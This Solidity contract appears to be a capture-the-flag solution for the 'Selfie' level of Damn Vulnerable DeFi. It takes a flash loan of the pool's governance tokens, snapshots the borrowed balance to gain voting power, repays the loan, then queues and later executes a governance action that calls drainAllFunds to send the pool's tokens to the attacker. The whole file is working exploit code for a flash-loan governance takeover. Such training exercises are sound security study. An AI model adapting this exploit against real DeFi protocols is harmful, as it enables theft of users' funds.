// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title AttackerContractSelfie
 * @author Juan Farber (github.com/Farber98)
 */

contract AttackerContractSelfie {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _token
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() external payable {
        // Calls the loan.
        selfiePool.flashLoan(token.balanceOf(address(selfiePool)));

        // Prepare data that we are going to execute on SelfiePool call. This is the drainAllFunds call.
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            msg.sender
        );

        // Queues the drainAllFunds action.
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
    }

    // Function called by selfiePool.
    fallback() external payable {
        // Makes token snapshot with our loaned balance.
        token.snapshot();

        // Repays the loan. We don't need them anymore as we have our snapshot.
        token.transfer(address(selfiePool), token.balanceOf(address(this)));
    }

    function drain() external payable {
        // Drain the funds after the 2 days passed.
        simpleGovernance.executeAction(actionId);
    }
}
